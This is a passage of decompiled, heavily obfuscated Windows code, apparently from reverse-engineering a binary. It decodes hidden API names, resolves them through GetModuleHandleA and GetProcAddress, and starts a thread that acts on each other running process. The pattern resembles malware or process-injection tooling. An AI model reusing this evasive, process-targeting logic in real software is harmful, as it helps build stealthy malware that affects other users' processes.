      bVar10 = bVar3 + (cVar4 + 100U & bVar3) * -2 + -0x58 + cVar4;
LAB_14000a2b0:
      while (uVar8 = uVar9, uVar6 < uVar9 + uVar7) {
        while( true ) {
          do {
            uVar9 = uVar8;
            if (uVar7 == uVar9 + 4) {
              cVar11 = ('8' - (cVar4 + 0x18U & bVar3)) * '\x02' + bVar3;
              goto LAB_14000a91b;
            }
            if (uVar7 == uVar9 + 0x28) {
              bVar10 = cVar4 + bVar3 + (cVar4 - 0x40U & bVar3) * -2 + 0x80;
              uVar9 = uVar9 + 1;
              goto LAB_14000a1d2;
            }
            if (uVar7 == uVar9 + 0x1000) {
              bVar10 = cVar4 + bVar3 + (cVar4 + 0x68U & bVar3) * -2 + 0x90;
              goto LAB_14000a1d2;
            }
            if (uVar7 == uVar9 + 3) {
              bVar10 = (cVar4 + bVar3 + (cVar4 + 0x60U & bVar3) * -2) - 0x40;
              goto LAB_14000a9af;
            }
            if (uVar7 == uVar9 + 0x20) {
              cVar11 = bVar3 + (cVar4 + 8U & bVar3) * -2 + -0x30;
              goto LAB_14000a847;
            }
            uVar8 = uVar9;
          } while (uVar7 == uVar9 + 0x400);
          uVar7 = uVar9 + 0x41;
          uVar8 = uVar9 + 0x43;
          if (uVar7 < uVar9 + 0x49) {
            bVar10 = ('\f' - (cVar4 + 0x7cU & bVar3)) * '\x02' + cVar4 + bVar3;
            goto LAB_14000a1c0;
          }
          if (uVar7 < uVar9 + 0x84) {
            bVar10 = ('\x14' - (cVar4 + 0x24U & bVar3)) * '\x02' + cVar4 + bVar3;
            goto LAB_14000a1d0;
          }
          if (uVar7 < uVar9 + 0x85) {
            bVar10 = ('$' - (cVar4 + 0x74U & bVar3)) * '\x02' + bVar3 + cVar4;
            uVar9 = uVar8;
            goto LAB_14000a250;
          }
          if (uVar7 < uVar9 + 0xbd) break;
          if (uVar7 < uVar9 + 0x48) {
            cVar11 = bVar3 + (cVar4 + 0x14U & bVar3) * -2 + -0x78;
            uVar9 = uVar8;
            goto LAB_14000a4c4;
          }
          if (uVar7 < uVar9 + 0x83) {
            bVar10 = cVar4 + bVar3 + (cVar4 + 0xbcU & bVar3) * -2 + 0x98;
            uVar9 = uVar8;
            goto LAB_14000a4a4;
          }
          uVar7 = uVar9 + 0x4d;
          uVar8 = uVar9 + 0x8d;
          if (uVar9 + 0x28d < uVar7) {
            bVar10 = (cVar4 + bVar3 + (cVar4 - 0x20U & bVar3) * -2) - 0x40;
            uVar6 = uVar6 + local_148[uVar6 + 0x10] + uVar8 + 1;
            uVar9 = uVar8;
            goto LAB_14000a1d2;
          }
          if (uVar9 + 0xb7 < uVar7) {
            cVar11 = bVar3 + (cVar4 + 0x88U & bVar3) * -2 + -0x30;
            uVar9 = uVar8;
            goto LAB_14000a8b0;
          }
          if (uVar9 + 0x96 < uVar7) {
            bVar10 = cVar4 + bVar3 + (cVar4 + 0x80U & bVar3) * -2;
            uVar7 = uVar7 + uVar8;
            uVar9 = uVar8;
            goto LAB_14000a9af;
          }
          if (uVar9 + 0x10d < uVar7) {
            bVar10 = ('\b' - (cVar4 + 0x28U & bVar3)) * '\x02' + bVar3 + cVar4;
            uVar9 = uVar8;
            goto LAB_14000a958;
          }
          if (uVar9 + 0xe7 < uVar7) {
            bVar10 = ('\x10' - (cVar4 - 0x30U & bVar3)) * '\x02' + bVar3 + cVar4;
            uVar9 = uVar8;
            goto LAB_14000a1d2;
          }
          if (uVar7 <= uVar9 + 0x95) {
            uVar7 = uVar9 + 0xad;
            uVar8 = uVar9 + 0x111;
          }
        }
        bVar10 = (',' - (cVar4 + 0x1cU & bVar3)) * '\x02' + bVar3 + cVar4;
        uVar9 = uVar8;
      }
      if (uVar7 < uVar9 + 0x7a) {
        bVar10 = ('\x04' - (cVar4 - 0x2cU & bVar3)) * '\x02' + bVar3 + cVar4;
LAB_14000a592:
        if (uVar9 + uVar7 != 0x2a) {
          if (uVar9 + 4 < uVar7) {
            bVar10 = bVar3 + (cVar4 + 0x84U & bVar3) * -2 + -0x18 + cVar4;
LAB_14000a5c3:
            if (1 < uVar7) {
              bVar10 = ((bVar3 - (cVar4 + 0x20U & bVar3)) + ' ') * '\x02' + cVar4;
              goto LAB_14000a958;
            }
            if (uVar9 + 6 < uVar7) {
              cVar11 = bVar3 + (cVar4 - 0x18U & bVar3) * -2 + -0x70;
LAB_14000a4c4:
              bVar10 = cVar11 + cVar4;
LAB_14000a4c7:
              if (uVar9 < 0x40) {
LAB_14000a4a4:
                local_148[uVar6 + 0x10] = bVar10;
                uVar6 = uVar6 + 1;
                goto LAB_14000a1d2;
              }
              bVar10 = (('\x18' - (cVar4 + 0x78U & bVar3)) * '\x02' + bVar3 + cVar4) * '\x02';
              goto LAB_14000a91e;
            }
            if (uVar7 == uVar9 + 1) {
              bVar10 = cVar4 + bVar3 + (cVar4 + 0x90U & bVar3) * -2 + 0xa0;
              uVar6 = uVar6 + local_148[uVar6 + 0x10] + uVar9 + 1;
              goto LAB_14000a1d2;
            }
            if (uVar7 == uVar9 + 3) {
              bVar10 = (cVar4 + bVar3 + (cVar4 + 0x88U & bVar3) * -2) - 0x30;
            }
            else {
              if (uVar7 != uVar9 + 2) {
                if (uVar7 != uVar9 + 6) goto LAB_14000a4c7;
                bVar10 = cVar4 + bVar3 + (cVar4 + 0x80U & bVar3) * -2;
                goto LAB_14000a1d2;
              }
              bVar10 = (cVar4 + bVar3 + (cVar4 + 0x30U & bVar3) * -2) - 0x20;
              uVar7 = uVar7 + uVar9;
            }
          }
          else {
            if (uVar7 == uVar9 + 1) {
              cVar11 = bVar3 + (cVar4 + 0x2cU & bVar3) * -2 + -8;
LAB_14000a91b:
              bVar10 = cVar11 + cVar4;
LAB_14000a91e:
              local_148[uVar6 + 0x10] = cVar4 + 0x4cU + (cVar4 + 0x4cU & bVar3) * -2 + -0x14 + bVar3
              ;
              uVar9 = uVar9 + 1;
              goto LAB_14000a1d2;
            }
            if (uVar7 == uVar9 + 2) {
              bVar10 = ('\f' - (cVar4 + 0x7cU & bVar3)) * '\x02' + bVar3 + cVar4;
              goto LAB_14000a1d2;
            }
            if (uVar7 == uVar9 + 4) {
              bVar10 = ('\x1c' - (cVar4 - 0x34U & bVar3)) * '\x02' + bVar3 + cVar4;
              uVar7 = uVar7 + uVar9;
              goto LAB_14000a9af;
            }
            if (uVar7 != uVar9 + 3) {
              if (uVar7 != uVar9 + 8) goto LAB_14000a5c3;
              bVar10 = ('<' - (cVar4 + 0x6cU & bVar3)) * '\x02' + bVar3 + cVar4;
              uVar6 = uVar6 + local_148[uVar6 + 0x10] + uVar9 + 1;
              goto LAB_14000a1d2;
            }
            bVar10 = ('$' - (cVar4 + 0x74U & bVar3)) * '\x02' + bVar3 + cVar4;
          }
LAB_14000a9af:
          uVar6 = uVar6 - bVar10;
          goto LAB_14000a1d2;
        }
        cVar11 = ('(' - (cVar4 - 0x38U & bVar3)) * '\x02';
      }
      else {
        if (uVar7 == uVar9 + 1) {
          bVar10 = ('(' - (cVar4 - 0x38U & bVar3)) * '\x02' + bVar3 + cVar4;
          uVar6 = uVar6 + local_148[uVar6 + 0x10] + uVar9 + 1;
          goto LAB_14000a1d2;
        }
        if (uVar7 != uVar9 + 2) {
          if (uVar7 == uVar9 + 3) {
            bVar10 = cVar4 + bVar3 + (cVar4 - 0x40U & bVar3) * -2 + 0x80;
            goto LAB_14000a9af;
          }
          if (uVar7 == uVar9 + 5) {
            bVar10 = bVar3 + (cVar4 + 0x10U & bVar3) * -2 + -0x60 + cVar4;
            goto LAB_14000a958;
          }
          if (uVar7 != uVar9 + 2) goto LAB_14000a592;
          bVar10 = cVar4 + bVar3 + (cVar4 + 0xb8U & bVar3) * -2 + 0xb0;
          goto LAB_14000a1d2;
        }
        cVar11 = ('8' - (cVar4 + 0x18U & bVar3)) * '\x02' + bVar3;
      }
LAB_14000a847:
      bVar10 = cVar4 + 0x9cU + (cVar4 + 0x9cU & bVar3) * -2 + -0x44 + bVar3;
      local_148[uVar6 + 0x10] = bVar10;
      uVar6 = uVar6 - ((ulonglong)bVar10 + uVar9 + 1);
      uVar9 = uVar9 + 1;
LAB_14000a8b0:
      bVar10 = cVar11 + cVar4;
      bVar1 = (char)uVar6 + 0x70;
      local_148[uVar6 + 0x10] = bVar1 + (bVar1 & bVar3) * -2 + -0x10 + bVar3;
      uVar7 = uVar7 + 1;
      lVar5 = uVar6 + (-1 - uVar7);
      uVar6 = lVar5 + local_148[lVar5 + 0x10] + uVar9 + 1;
      goto LAB_14000a1d2;
    }
    uVar8 = 0;
LAB_14000cb6a:
    FUN_14000e3a0(&local_a0);
  }
  return uVar8;
}



/* ==================================================================== */
/* FUN_14000cba0 @ 14000cba0 */

undefined8 FUN_14000cba0(undefined4 *param_1)

{
  char cVar1;

  cVar1 = FUN_140009fd0(*param_1,param_1[1],param_1 + 2,*(undefined8 *)(param_1 + 10));
  if (cVar1 != '\0') {
    LOCK();
    **(int **)(param_1 + 8) = **(int **)(param_1 + 8) + 1;
    UNLOCK();
  }
  FUN_14000e3a0(param_1 + 2);
  free(param_1);
  return 0;
}



/* ==================================================================== */
/* FUN_14000cbf0 @ 14000cbf0 */

/* WARNING: Function: __security_check_cookie replaced with injection: security_check_cookie */

ulonglong FUN_14000cbf0(DWORD param_1)

{
  ulonglong uVar1;
  ulonglong uVar2;
  ulonglong uVar3;
  DWORD DVar4;
  HANDLE *ppvVar5;
  DWORD *pDVar6;
  DWORD DVar7;
  ulonglong uVar8;
  HMODULE hModule;
  FARPROC pFVar9;
  DWORD *lpParameter;
  byte bVar10;
  LPCSTR lpModuleName;
  char cVar11;
  byte bVar12;
  HANDLE *ppvVar13;
  ulonglong uVar14;
  longlong lVar15;
  LPCSTR lpProcName;
  DWORD *pDVar16;
  ulonglong uVar17;
  byte bVar18;
  char cVar19;
  undefined1 auStackY_118 [32];
  byte local_e8;
  byte bStack_d9;
  undefined4 local_d8;
  undefined4 local_d4;
  undefined4 local_d0;
  undefined2 local_cc;
  undefined8 local_ca;
  undefined1 local_c2;
  byte bStack_b9;
  undefined4 local_b8;
  undefined4 local_b4;
  undefined2 local_b0;
  undefined8 local_ae;
  undefined4 local_a6;
  undefined2 local_a2;
  DWORD *local_98;
  HANDLE local_90;
  undefined4 local_88 [2];
  HANDLE *local_80;
  HANDLE *ppvStack_78;
  undefined8 local_70;
  DWORD *local_68;
  DWORD *pDStack_60;
  undefined8 local_58;
  undefined8 local_50;
  undefined8 uStack_48;
  undefined8 local_40;
  ulonglong local_38;
  CHAR local_30 [8];

  local_38 = DAT_14005d040 ^ (ulonglong)auStackY_118;
  DVar7 = GetCurrentProcessId();
  local_68 = (DWORD *)0x0;
  pDStack_60 = (DWORD *)0x0;
  local_58 = 0;
  FUN_140009f90(&local_68);
  local_50 = 0;
  uStack_48 = 0;
  local_40 = 0;
  FUN_1400392c0(&local_50,&LAB_140009d50);
  local_d8 = 0x4b6d556e;
  local_d4 = 0x45664349;
  local_d0 = 0x404f7247;
  local_cc = 0xcd5f;
  local_ca = 0;
  local_c2 = 0;
  bVar18 = local_e8;
LAB_14000cca0:
  uVar8 = DAT_140a618c8;
  uVar17 = DAT_140a618d0;
LAB_14000ccb0:
  uVar14 = 0;
LAB_14000ccb2:
  if (0x16 < uVar14) {
    lpProcName = (LPCSTR)&local_d8;
LAB_14000d529:
    local_b8 = 0x17300104;
    local_b4 = 0x132c5b16;
    local_b0 = 0x8d12;
    local_ae = 0;
    local_a6 = 0;
    local_a2 = 0;
LAB_14000d560:
    uVar14 = 0;
    uVar8 = DAT_140a618c8;
    uVar17 = DAT_140a618d0;
LAB_14000d572:
    do {
      if (0x17 < uVar14) {
        lpModuleName = (LPCSTR)&local_b8;
LAB_14000e066:
        hModule = GetModuleHandleA(lpModuleName);
        pFVar9 = GetProcAddress(hModule,lpProcName);
        local_88[0] = 0;
        local_80 = (HANDLE *)0x0;
        ppvStack_78 = (HANDLE *)0x0;
        local_70 = 0;
        FUN_140009d30(&local_80);
        FUN_14000e200(&local_80,(longlong)pDStack_60 - (longlong)local_68 >> 2);
        pDVar6 = pDStack_60;
        for (pDVar16 = local_68; pDVar16 != pDVar6; pDVar16 = pDVar16 + 1) {
          DVar4 = *pDVar16;
          if ((DVar4 != param_1) && (DVar4 != DVar7)) {
            lpParameter = (DWORD *)FUN_140051870(0x30);
            *lpParameter = DVar4;
            lpParameter[1] = param_1;
            local_98 = lpParameter;
            FUN_14000e420(lpParameter + 2,&local_50);
            *(undefined4 **)(lpParameter + 8) = local_88;
            *(FARPROC *)(lpParameter + 10) = pFVar9;
            local_90 = CreateThread((LPSECURITY_ATTRIBUTES)0x0,0,FUN_14000cba0,lpParameter,0,
                                    (LPDWORD)0x0);
            if (local_90 == (HANDLE)0x0) {
              FUN_14000e3a0(lpParameter + 2);
              free(lpParameter);
            }
            else {
              FUN_14000e4b0(&local_80,&local_90);
            }
          }
        }
        WaitForMultipleObjects
                  ((DWORD)((longlong)ppvStack_78 - (longlong)local_80 >> 3),local_80,1,0xffffffff);
        ppvVar5 = ppvStack_78;
        for (ppvVar13 = local_80; ppvVar13 != ppvVar5; ppvVar13 = ppvVar13 + 1) {
          CloseHandle(*ppvVar13);
        }
        lVar15 = (longlong)pDStack_60 - (longlong)local_68;
        FUN_14000e300(&local_80);
        FUN_14000e3a0(&local_50);
        FUN_14000e720(&local_68);
        return lVar15 >> 2 & 0xffffffff;
      }
      bVar18 = *(byte *)((longlong)local_88 + (uVar14 - 0x30));
LAB_14000d582:
      if (uVar14 < uVar8) {
        lpModuleName = auStackY_118 + 0xbc3209;
        goto LAB_14000e066;
      }
      cVar11 = (char)uVar14;
      if (uVar8 < uVar17 + 1) goto code_r0x00014000d594;
      if (uVar8 != uVar17 + 1) {
        if (uVar8 == uVar17 + 2) {
          local_e8 = bVar18 + (cVar11 - 5U) + (cVar11 - 5U & bVar18) * -2 + 0x23;
LAB_14000dfa9:
          bVar10 = bVar18 + (bVar18 & cVar11 + 0x8fU) * -2 + '\x17' + cVar11 + 0x8fU;
          *(byte *)((longlong)local_88 + (uVar14 - 0x30)) = bVar10;
          uVar14 = uVar14 - ((ulonglong)bVar10 + uVar17 + 1);
          uVar17 = uVar17 + 1;
          goto LAB_14000dfcf;
        }
        if (uVar8 == uVar17 + 4) {
          local_e8 = bVar18 + (cVar11 - 0x2bU) + (cVar11 - 0x2bU & bVar18) * -2 + 0x2d;
          goto LAB_14000df7b;
        }
        if (uVar8 == uVar17 + 6) {
          local_e8 = cVar11 + 99U + bVar18 + (bVar18 & cVar11 + 99U) * -2 + 0x4b;
        }
        else {
          if (uVar8 != uVar17 + 3) {
            if (uVar8 != uVar17 + 4) goto LAB_14000d5f4;
            bVar10 = cVar11 + 0x17;
            cVar19 = bVar18 + (bVar18 & bVar10) * -2 + '_';
LAB_14000def6:
            local_e8 = cVar19 + bVar10;
            goto LAB_14000def9;
          }
          local_e8 = cVar11 + 0x3dU + bVar18 + (bVar18 & cVar11 + 0x3dU) * -2 + 0x55;
          uVar17 = uVar17 + 1;
        }
        goto LAB_14000d572;
      }
      local_e8 = bVar18 + cVar11 + 0x47U + (cVar11 + 0x47U & bVar18) * -2 + 0xf;
      uVar14 = uVar14 + *(byte *)((longlong)local_88 + (uVar14 - 0x30)) + uVar17 + 1;
    } while( true );
  }
  bVar10 = *(byte *)((longlong)local_88 + (uVar14 - 0x50));
LAB_14000ccc2:
  if (uVar14 < uVar8) {
    lpProcName = auStackY_118 + 0x11b0c94;
    goto LAB_14000d529;
  }
  cVar11 = (char)uVar14;
  if (uVar17 + 1 <= uVar8) {
    if (uVar8 == uVar17 + 1) {
      bVar18 = cVar11 + 0x6c;
      cVar11 = '\x06';
      goto LAB_14000d4ab;
    }
    if (uVar8 == uVar17 + 2) {
      bVar18 = cVar11 + 0xb4;
      cVar11 = '\n';
      goto LAB_14000d455;
    }
    if (uVar8 == uVar17 + 3) {
      bVar18 = cVar11 - 0x2c;
      cVar19 = '\x1a';
      goto LAB_14000d403;
    }
    if (uVar8 != uVar17 + 7) {
      if (uVar8 != uVar17 + 3) goto LAB_14000cd30;
      bVar18 = cVar11 + 0xac;
      cVar19 = '&';
LAB_14000d398:
      bVar18 = (cVar19 - (bVar18 & bVar10)) * '\x02' + bVar18 + bVar10;
      goto LAB_14000d3ab;
    }
    bVar18 = ('\x1e' - (cVar11 + 0x1cU & bVar10)) * '\x02' + cVar11 + 0x1cU + bVar10;
    goto LAB_14000ccb2;
  }
  bVar18 = cVar11 + 0x24U + (cVar11 + 0x24U & bVar10) * -2 + '\x04' + bVar10;
LAB_14000cd30:
  if (uVar14 < uVar17) {
    lpProcName = auStackY_118 + 0x159c870;
    goto LAB_14000d529;
  }
  if (uVar17 + 1 <= uVar8) {
    if (uVar8 != uVar17 + 1) {
      if (uVar8 != uVar17 + 2) {
        if (uVar8 != uVar17 + 3) {
          if (uVar8 == uVar17 + 7) {
            bVar18 = bVar10 + (cVar11 - 0x14U) + (cVar11 - 0x14U & bVar10) * -2 + 0x8c;
            goto LAB_14000d312;
          }
          if (uVar8 != uVar17 + 3) goto LAB_14000cda0;
          bVar18 = bVar10 + cVar11 + 0x7cU + (cVar11 + 0x7cU & bVar10) * -2 + 0x9c;
          uVar14 = uVar14 + *(byte *)((longlong)local_88 + (uVar14 - 0x50)) + uVar17 + 1;
          goto LAB_14000ccb2;
        }
        bVar18 = bVar10 + cVar11 + 0xa4U + (cVar11 + 0xa4U & bVar10) * -2 + 0x84;
        goto LAB_14000d433;
      }
      bVar18 = ('2' - (cVar11 + 0x84U & bVar10)) * '\x02' + cVar11 + 0x84U + bVar10;
      uVar17 = uVar17 + 1;
      goto LAB_14000ccb2;
    }
    bVar18 = cVar11 + 0x3c;
    cVar19 = '.';
    goto LAB_14000d398;
  }
  bVar18 = ('*' - (cVar11 - 0xcU & bVar10)) * '\x02' + (cVar11 - 0xcU) + bVar10;
LAB_14000cda0:
  while (uVar14 < uVar17 + uVar8) {
    while( true ) {
      if (uVar8 == uVar17 + 0x61) {
        bVar18 = bVar10 + cVar11 + 0x78U + (cVar11 + 0x78U & bVar10) * -2 + 0xb8;
        goto LAB_14000d3ab;
      }
      if (uVar8 == uVar17 + 6) {
        bVar18 = (bVar10 + (cVar11 - 0x40U) + (cVar11 - 0x40U & bVar10) * -2) - 0x40;
        uVar17 = uVar17 + 1;
        goto LAB_14000ccb2;
      }
      uVar3 = uVar17 + 0x80;
      if (uVar8 == uVar3) {
        bVar18 = (bVar10 + cVar11 + 8U + (cVar11 + 8U & bVar10) * -2) - 0x38;
        goto LAB_14000ccb2;
      }
      if (uVar8 == uVar17 + 1) {
        bVar18 = (bVar10 + cVar11 + 0x50U + (cVar11 + 0x50U & bVar10) * -2) - 0x30;
        goto LAB_14000d416;
      }
      if (uVar8 == uVar17 + 0x20) {
        bVar18 = (bVar10 + cVar11 + 0x98U + (cVar11 + 0x98U & bVar10) * -2) - 0x28;
        goto LAB_14000d430;
      }
      uVar1 = uVar17 + 0xe1;
      if (uVar3 < uVar17 + 0xe2) {
        bVar18 = ('\x06' - (cVar11 + 0x6cU & bVar10)) * '\x02' + cVar11 + 0x6cU + bVar10;
        goto LAB_14000cca0;
      }
      uVar8 = uVar3;
      if (uVar3 < uVar17 + 0x101) {
        bVar18 = ('\n' - (cVar11 + 0xb4U & bVar10)) * '\x02' + cVar11 + 0xb4U + bVar10;
        uVar17 = uVar1;
        goto LAB_14000ccb0;
      }
      uVar2 = uVar17 + 0x142;
      if (uVar3 < uVar2) {
        bVar18 = ('\x0e' - (cVar11 - 4U & bVar10)) * '\x02' + (cVar11 - 4U) + bVar10;
        uVar17 = uVar1;
        goto LAB_14000ccc2;
      }
      if (uVar3 < uVar17 + 0xe7) {
        bVar18 = ('\x12' - (cVar11 + 0x44U & bVar10)) * '\x02' + cVar11 + 0x44U + bVar10;
        uVar17 = uVar1;
        goto LAB_14000cd30;
      }
      if (uVar3 < uVar17 + 0x161) break;
      uVar3 = uVar17 + 0x143;
      uVar8 = uVar2;
      if (uVar17 + 0x149 < uVar2) {
        bVar18 = cVar11 + 0x60;
        cVar11 = '0';
        uVar17 = uVar3;
        goto LAB_14000d4ab;
      }
      if (uVar17 + 0x1c3 < uVar2) {
        bVar18 = cVar11 + 0xa8;
        cVar11 = '4';
        uVar17 = uVar3;
        goto LAB_14000d455;
      }
      uVar8 = uVar17 + 0x144;
      if (uVar8 < uVar2) {
        bVar18 = ('8' - (cVar11 - 0x10U & bVar10)) * '\x02' + (cVar11 - 0x10U) + bVar10;
        uVar8 = uVar2;
        uVar17 = uVar3;
        goto LAB_14000d312;
      }
      if (uVar17 + 0x163 < uVar2) {
        bVar18 = ('<' - (cVar11 + 0x38U & bVar10)) * '\x02' + cVar11 + 0x38U + bVar10;
        uVar8 = uVar2;
        uVar17 = uVar3;
        goto LAB_14000d433;
      }
      if (uVar17 + 0x1a4 < uVar2) {
        bVar18 = bVar10 + cVar11 + 0x80U + (cVar11 + 0x80U & bVar10) * -2 + 0x80;
        uVar8 = uVar2;
        uVar17 = uVar3;
        goto LAB_14000d430;
      }
      uVar17 = uVar17 + 0x14a;
    }
    bVar18 = ('\x16' - (cVar11 + 0x8cU & bVar10)) * '\x02' + cVar11 + 0x8cU + bVar10;
    uVar17 = uVar1;
  }
  if (uVar8 < uVar17 + 1) {
    bVar18 = ('\x02' - (cVar11 + 0x24U & bVar10)) * '\x02' + cVar11 + 0x24U + bVar10;
LAB_14000d020:
    if (uVar8 + uVar17 == 0x61) {
      bVar18 = (cVar11 - 0x18U) + (cVar11 - 0x18U & bVar10) * -2 + 0xa8;
LAB_14000d312:
      bVar12 = bVar10 + (bVar10 & cVar11 + 0xcU) * -2 + -0x54 + cVar11 + 0xcU;
      *(byte *)((longlong)local_88 + (uVar14 - 0x50)) = bVar12;
      uVar17 = uVar17 + 1;
      uVar14 = uVar14 - (bVar12 + uVar17);
LAB_14000d468:
      bVar12 = (char)uVar14 + 0x30;
      *(byte *)((longlong)local_88 + (uVar14 - 0x50)) =
           bVar12 + (bVar12 & bVar10) * -2 + -0x50 + bVar10;
      uVar8 = uVar8 + 1;
      lVar15 = uVar14 + (-1 - uVar8);
      uVar14 = lVar15 + *(byte *)((longlong)local_88 + lVar15 + -0x50) + uVar17 + 1;
      goto LAB_14000ccb2;
    }
    if (uVar17 + 1 < uVar8) {
      bVar18 = (bVar10 + cVar11 + 0x94U + (cVar11 + 0x94U & bVar10) * -2) - 0xc;
LAB_14000d053:
      if (uVar8 == 0) {
        if (uVar17 == 0xffffffffffffffff) {
          bVar18 = cVar11 - 0x30;
          cVar11 = '(';
LAB_14000d4ab:
          bVar18 = (cVar11 - (bVar18 & bVar10)) * '\x02' + bVar18 + bVar10;
          uVar14 = uVar14 + *(byte *)((longlong)local_88 + (uVar14 - 0x50)) + uVar17 + 1;
          goto LAB_14000ccb2;
        }
        if (uVar17 == 0xfffffffffffffffe) {
          bVar18 = cVar11 + 0x18;
          cVar11 = ',';
LAB_14000d455:
          bVar18 = (cVar11 - (bVar18 & bVar10)) * '\x02' + bVar18 + bVar10;
          goto LAB_14000d468;
        }
        if (uVar17 == 0xfffffffffffffffd) {
          bVar18 = ('0' - (cVar11 + 0x60U & bVar10)) * '\x02' + cVar11 + 0x60U + bVar10;
          goto LAB_14000d312;
        }
        if (uVar17 != 0xfffffffffffffffd) {
          if (uVar17 != 0xfffffffffffffff8) {
            if (5 < uVar17) {
              bVar18 = (('\f' - (cVar11 + 0x58U & bVar10)) * '\x02' + cVar11 + 0x58U + bVar10) *
                       '\x02';
              goto LAB_14000d3ab;
            }
            *(byte *)((longlong)local_88 + (uVar14 - 0x50)) = bVar18;
            uVar14 = uVar14 + 1;
            goto LAB_14000ccb2;
          }
          bVar18 = bVar10 + cVar11 + 0x10U + (cVar11 + 0x10U & bVar10) * -2 + 0x90;
          goto LAB_14000d3ab;
        }
        bVar18 = cVar11 + 0x38;
        cVar19 = '<';
LAB_14000d403:
        cVar19 = (cVar19 - (bVar18 & bVar10)) * '\x02' + bVar18;
      }
      else {
        cVar19 = bVar10 + cVar11 + 0xa0U + (cVar11 + 0xa0U & bVar10) * -2 + -0x60;
      }
      bVar18 = cVar19 + bVar10;
LAB_14000d416:
      *(byte *)((longlong)local_88 + (uVar14 - 0x50)) =
           (cVar11 - 0x3cU) + (cVar11 - 0x3cU & bVar10) * -2 + -0x5c + bVar18 + bVar10;
      goto LAB_14000d430;
    }
    if (uVar8 == uVar17 + 1) {
      bVar18 = (bVar10 + (cVar11 - 0x24U) + (cVar11 - 0x24U & bVar10) * -2) - 4;
LAB_14000d3ab:
      *(byte *)((longlong)local_88 + (uVar14 - 0x50)) =
           bVar10 + (bVar10 & cVar11 + 0x7cU) * -2 + -100 + cVar11 + 0x7cU;
      uVar17 = uVar17 + 1;
      goto LAB_14000ccb2;
    }
    if (uVar8 == uVar17 + 2) {
      bVar18 = ('\x02' - (cVar11 + 0x24U & bVar10)) * '\x02' + cVar11 + 0x24U + bVar10;
      uVar17 = uVar17 + 1;
      goto LAB_14000ccb2;
    }
    if (uVar8 != uVar17 + 3) {
      if (uVar8 == uVar17 + 7) {
        bVar18 = ('\x16' - (bVar10 & cVar11 + 0x8cU)) * '\x02' + bVar10 + cVar11 + 0x8cU;
        goto LAB_14000d312;
      }
      if (uVar8 != uVar17 + 3) goto LAB_14000d053;
      bVar18 = ('\x1e' - (bVar10 & cVar11 + 0x1cU)) * '\x02' + bVar10 + cVar11 + 0x1cU;
      uVar14 = uVar14 + *(byte *)((longlong)local_88 + (uVar14 - 0x50)) + uVar17 + 1;
      goto LAB_14000ccb2;
    }
    bVar18 = ('\x12' - (bVar10 & cVar11 + 0x44U)) * '\x02' + bVar10 + cVar11 + 0x44U;
  }
  else {
    if (uVar8 == uVar17 + 1) {
      bVar18 = bVar10 + (cVar11 - 0x18U) + (cVar11 - 0x18U & bVar10) * -2 + 0xa8;
      uVar14 = uVar14 + *(byte *)((longlong)local_88 + (uVar14 - 0x50)) + uVar17 + 1;
      goto LAB_14000ccb2;
    }
    if (uVar8 == uVar17 + 2) {
      bVar18 = bVar10 + cVar11 + 0x78U + (cVar11 + 0x78U & bVar10) * -2 + 0xb8;
      goto LAB_14000d312;
    }
    if (uVar8 != uVar17 + 3) {
      if (uVar8 != uVar17 + 6) goto LAB_14000d020;
      bVar18 = (bVar10 + cVar11 + 0x28U + (cVar11 + 0x28U & bVar10) * -2) - 0x18;
      goto LAB_14000d3ab;
    }
    bVar18 = (bVar10 + cVar11 + 8U + (cVar11 + 8U & bVar10) * -2) - 0x38;
LAB_14000d430:
    uVar8 = uVar8 + uVar17;
  }
LAB_14000d433:
  uVar14 = uVar14 - bVar18;
  goto LAB_14000ccb2;
code_r0x00014000d594:
  local_e8 = cVar11 + 0x6dU + (cVar11 + 0x6dU & bVar18) * -2 + '\x05' + bVar18;
LAB_14000d5f4:
  if (uVar14 < uVar17) {
    lpModuleName = auStackY_118 + 0x15ba99c;
    goto LAB_14000e066;
  }
  if (uVar17 + 0x41 <= uVar8) {
    if (uVar8 != uVar17 + 1) {
      if (uVar8 == uVar17 + 3) {
        bVar10 = cVar11 + 0x59;
        cVar19 = bVar18 + (bVar18 & bVar10) * -2 + -0x6f;
        goto LAB_14000dea0;
      }
      if (uVar8 != uVar17 + 2) goto LAB_14000d650;
      local_e8 = (cVar11 + 0x9bU + bVar18 + (bVar18 & cVar11 + 0x9bU) * -2) - 0x3d;
      uVar14 = uVar14 + *(byte *)((longlong)local_88 + (uVar14 - 0x30)) + uVar17 + 1;
      goto LAB_14000d572;
    }
    bVar10 = cVar11 - 0x35;
    cVar19 = bVar18 + (bVar18 & bVar10) * -2 + 's';
    goto LAB_14000def6;
  }
  local_e8 = bVar18 + (cVar11 - 0xfU) + (cVar11 - 0xfU & bVar18) * -2 + 0x69;
LAB_14000d650:
  while (uVar3 = uVar17, uVar14 < uVar17 + uVar8) {
    while( true ) {
      do {
        uVar17 = uVar3;
        if (uVar8 == uVar17 + 0x80) {
          local_e8 = ('\x13' - (cVar11 - 0x2aU & bVar18)) * '\x02' + (cVar11 - 0x2aU) + bVar18;
          goto LAB_14000def9;
        }
        if (uVar8 == uVar17 + 0x2a) {
          local_e8 = ('\x18' - (cVar11 + 0xb0U & bVar18)) * '\x02' + cVar11 + 0xb0U + bVar18;
          uVar17 = uVar17 + 1;
          goto LAB_14000d572;
        }
        if (uVar8 == uVar17 + 10) {
          local_e8 = ('\x1d' - (cVar11 + 0x8aU & bVar18)) * '\x02' + cVar11 + 0x8aU + bVar18;
          goto LAB_14000d572;
        }
        if (uVar8 == uVar17 + 1000) {
          local_e8 = ('\"' - (cVar11 + 100U & bVar18)) * '\x02' + cVar11 + 100U + bVar18;
          goto LAB_14000dea3;
        }
        if (uVar8 == uVar17 + 2) {
          local_e8 = (',' - (cVar11 + 0x18U & bVar18)) * '\x02' + cVar11 + 0x18U + bVar18;
          goto LAB_14000df7b;
        }
        if (uVar8 == uVar17 + 0x20) {
          local_e8 = ('1' - (cVar11 - 0xeU & bVar18)) * '\x02' + (cVar11 - 0xeU) + bVar18;
          goto LAB_14000dfa9;
        }
        if (uVar8 == uVar17 + 0x1000) {
          local_e8 = ('6' - (cVar11 - 0x34U & bVar18)) * '\x02' + (cVar11 - 0x34U) + bVar18;
          goto LAB_14000dfcf;
        }
        if (uVar8 == uVar17 + 4) {
          local_e8 = (';' - (cVar11 + 0xa6U & bVar18)) * '\x02' + cVar11 + 0xa6U + bVar18;
          uVar14 = uVar14 + *(byte *)((longlong)local_88 + (uVar14 - 0x30)) + uVar17 + 1;
          goto LAB_14000d572;
        }
        uVar3 = uVar17;
      } while (uVar8 == uVar17 + 0x40);
